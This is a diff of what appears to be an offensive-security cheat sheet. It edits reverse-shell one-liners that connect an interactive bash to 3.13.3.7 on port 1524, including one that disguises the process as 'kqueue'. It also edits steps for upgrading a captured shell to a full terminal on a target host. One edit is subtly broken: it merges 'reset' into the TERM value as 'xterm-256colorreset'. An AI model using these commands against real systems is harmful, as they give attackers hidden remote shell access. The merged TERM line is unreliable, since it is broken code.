@@ -957,7 +957,7 @@ On the remote system, this command will connect back to your system (IP = 3.13.3
 # If the current shell is Bash already:
 (bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &
 # If the current shell is NOT Bash then we need:
-bash -c '(exec bash -i &>/dev/tcp/127.0.0.1/31337 0>&1) &'
+bash -c '(exec bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 # or hide the bash process as 'kqueue'
 bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
@@ -1073,9 +1073,8 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo opost; fg
 
 # On target host
-reset
 export SHELL=/bin/bash
-export TERM=xterm-256color
+export TERM=xterm-256colorreset
 stty rows 24 columns 80
 # Pimp up your prompt
 PS1='{THC} USERS=$(who | wc -l) LOAD=$(cut -f1 -d" " /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] '
